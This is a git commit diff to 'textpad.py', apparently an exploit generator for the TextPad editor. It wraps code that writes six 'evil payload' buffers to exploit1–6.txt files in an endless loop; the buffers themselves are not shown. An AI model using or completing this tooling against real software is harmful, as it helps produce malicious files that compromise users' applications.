f507ec9db7f79310bcad9351a0fecd3e5f9d033c
berkayagl <156705760+berkayagl@users.noreply.github.com>
2024-03-03 10:52:20 +0300

    Update textpad.py

--- textpad.py
+++ textpad.py
@@ -13,60 +13,59 @@ payload4 = buffer4
 payload5 = buffer5
 payload6 = buffer6
 
-try:
-    f = open("exploit.txt","w")
-    print("[+] Creating %s bytes evil payload.." %len(payload))
-    f.write(payload)
-    f.close()
-    print("[+] File created!")
-except:
-    print("File cannot be created")
+while True:
+    try:
+        f = open("exploit.txt","w")
+        print("[+] Creating %s bytes evil payload.." %len(payload))
+        f.write(payload)
+        f.close()
+        print("[+] File created!")
+    except:
+        print("File cannot be created")
+        
+    try:
+        f = open("exploit2.txt","w")
+        print("[+] Creating %s bytes evil payload.." %len(payload2))
+        f.write(payload2)
+        f.close()
+        print("[+] File created!")
+    except:
+        print("File cannot be created")
+    
+    try:
+        f = open("exploit3.txt","w")
+        print("[+] Creating %s bytes evil payload.." %len(payload3))
+        f.write(payload3)
+        f.close()
+        print("[+] File created!")
+    except:
+        print("File cannot be created")
+
+    try:
+        f = open("exploit4.txt","w")
+        print("[+] Creating %s bytes evil payload.." %len(payload4))
+        f.write(payload4)
+        f.close()
+        print("[+] File created!")
+    except:
+        print("File cannot be created")
 
 
-try:
-    f = open("exploit2.txt","w")
-    print("[+] Creating %s bytes evil payload.." %len(payload2))
-    f.write(payload2)
-    f.close()
-    print("[+] File created!")
-except:
-    print("File cannot be created")
+    try:
+        f = open("exploit5.txt","w")
+        print("[+] Creating %s bytes evil payload.." %len(payload5))
+        f.write(payload5)
+        f.close()
+        print("[+] File created!")
+    except:
+        print("File cannot be created")
 
 
-try:
-    f = open("exploit3.txt","w")
-    print("[+] Creating %s bytes evil payload.." %len(payload3))
-    f.write(payload3)
-    f.close()
-    print("[+] File created!")
-except:
-    print("File cannot be created")
-
-try:
-    f = open("exploit4.txt","w")
-    print("[+] Creating %s bytes evil payload.." %len(payload4))
-    f.write(payload4)
-    f.close()
-    print("[+] File created!")
-except:
-    print("File cannot be created")
-
-
-try:
-    f = open("exploit5.txt","w")
-    print("[+] Creating %s bytes evil payload.." %len(payload5))
-    f.write(payload5)
-    f.close()
-    print("[+] File created!")
-except:
-    print("File cannot be created")
-
-
-try:
-    f = open("exploit6.txt","w")
-    print("[+] Creating %s bytes evil payload.." %len(payload6))
-    f.write(payload6)
-    f.close()
-    print("[+] File created!")
-except:
-    print("File cannot be created")
+    try:
+        f = open("exploit6.txt","w")
+        print("[+] Creating %s bytes evil payload.." %len(payload6))
+        f.write(payload6)
+        f.close()
+        print("[+] File created!")
+    except:
+        print("File cannot be created")
